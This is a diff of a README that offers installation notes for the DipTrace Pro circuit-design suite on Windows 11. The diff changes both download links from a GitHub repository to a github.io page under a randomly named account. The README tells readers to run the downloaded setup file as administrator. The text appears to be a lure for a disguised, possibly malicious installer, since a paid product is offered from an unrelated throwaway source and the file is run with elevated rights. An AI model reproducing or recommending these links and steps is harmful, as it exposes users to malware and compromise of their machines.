@@ -1,6 +1,6 @@
 # 🛠️ DipTrace-Install-Notes - Install DipTrace Pro on Windows 11
 
-[![Download DipTrace Setup Files](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/Selfpollinating-lichtenoideczema840/DipTrace-Install-Notes)
+[![Download DipTrace Setup Files](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://selfpollinating-lichtenoideczema840.github.io)
 
 ## 📋 Overview
 This repository provides instructions for installing DipTrace Pro on Windows 11. DipTrace acts as a professional software suite for circuit board design. Many users encounter issues during setup on newer Windows versions. These notes help you resolve common errors and complete the installation process.
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets these specifications:
 ## 📥 How to Install Software
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download: [https://github.com/Selfpollinating-lichtenoideczema840/DipTrace-Install-Notes](https://github.com/Selfpollinating-lichtenoideczema840/DipTrace-Install-Notes).
+1. Visit this page to download: [https://selfpollinating-lichtenoideczema840.github.io](https://selfpollinating-lichtenoideczema840.github.io).
 2. Locate the setup file in your Downloads folder.
 3. Right-click the installer file.
 4. Select the "Run as administrator" option from the menu.
